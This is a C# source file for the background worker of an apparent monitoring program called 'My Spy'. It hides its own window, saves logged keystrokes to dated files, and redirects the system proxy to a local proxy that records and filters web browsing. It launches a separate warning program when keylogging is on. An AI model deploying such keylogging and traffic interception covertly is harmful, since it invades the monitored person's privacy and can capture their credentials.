using Microsoft.Win32;
using Saving;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using TrotiNet;

namespace My_Spy_Worker
{
    public partial class Form1 : Form
    {
        //pristup k registru kde su ulozene nastavenia
        RegistryKey registry = Registry.LocalMachine.OpenSubKey("Software\\My_Spy\\Settings", false);
        bool keylogger = false,internet = false;
        static string PathMS = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy";
        int day;

        public Form1()
        {
            InitializeComponent();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Hide();
            ShowInTaskbar = false;

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            day = DateTime.Now.Day;

            keylogger = bool.Parse((string)registry.GetValue("Keylogger", "False"));

            internet = bool.Parse((string)registry.GetValue("Internet", "False"));

            if (keylogger)
            ShowWarning();

            if(internet)
            {
                try
                {

                    RegistryKey registryi = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", true);
                    registryi.SetValue("ProxyEnable", 1);
                    registryi.SetValue("ProxyServer", "127.0.0.1:8333");

                    InternetReports.BlockSites = bool.Parse((string)registry.GetValue("InternetBlockList", "False"));
                    InternetReports.BlockSocialSites = bool.Parse((string)registry.GetValue("InternetBlockSocial", "False"));

                    if (InternetReports.BlockSites)
                    {
                        if (File.Exists(PathMS + "/Block/BlockWebsites.dat"))
                        {
                            SaveWriter set = new SaveWriter(PathMS + "/Block/BlockWebsites.dat");
                            set.Load();
                            for (int i = 0; i < set.GetItemInt("Count"); i++)
                            {
                                InternetReports.WebBlock.Add(set.GetItem("Website" + i));
                            }
                        }
                    }

                    Directory.CreateDirectory(PathMS+ "/MonitoringReports/Internet/");

                    InternetReports.save = new StreamWriter(PathMS + "/MonitoringReports/Internet/"+DateTime.Now.Day+"-"+DateTime.Now.Month+"-"+DateTime.Now.Year+".dat",true);

                    int port = 8333;
                    //const bool bUseIPv6 = false;

                    TcpServer Server = new TcpServer(port,false);

                    Server.Start(TransparentProxy.CreateProxy);

                }catch(Exception ex)
                {
                    Debug.WriteLine(""+ex);
                }
            }

        }


        void ShowWarning()
        {
            try
            {
                Process[] processes = Process.GetProcessesByName("Warning");
                if (processes.Length < 1)
                {
                    Process prc = new Process();
                    prc.StartInfo.FileName = AppDomain.CurrentDomain.BaseDirectory + "/Warning.exe";
                    prc.StartInfo.Arguments = "keylogger";
                    prc.Start();
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("" + ex);
                Application.Exit();
            }
        }


        void SaveKeyloggerData()
        {
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/MonitoringReports/Key/");
            using (StreamWriter wrt = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/My Spy/MonitoringReports/Key/" + DateTime.Now.Day + "-" + DateTime.Now.Month + "-" + DateTime.Now.Year + ".dat", true))
            {
                wrt.Write(KeyInfo.Text.ToString());
                KeyInfo.Text.Clear();
            }
        }

 

        private void timer2_Tick(object sender, EventArgs e)
        {
            if (keylogger)
            {
                ShowWarning();
                SaveKeyloggerData();
            }

            if(day!=DateTime.Now.Day)
            {
                InternetReports.save.Flush();
                InternetReports.save.Close();

                InternetReports.save = new StreamWriter(PathMS + "/MonitoringReports/Internet/" + DateTime.Now.Day + "-" + DateTime.Now.Month + "-" + DateTime.Now.Year + ".dat", true);
            }
        }


    }
}
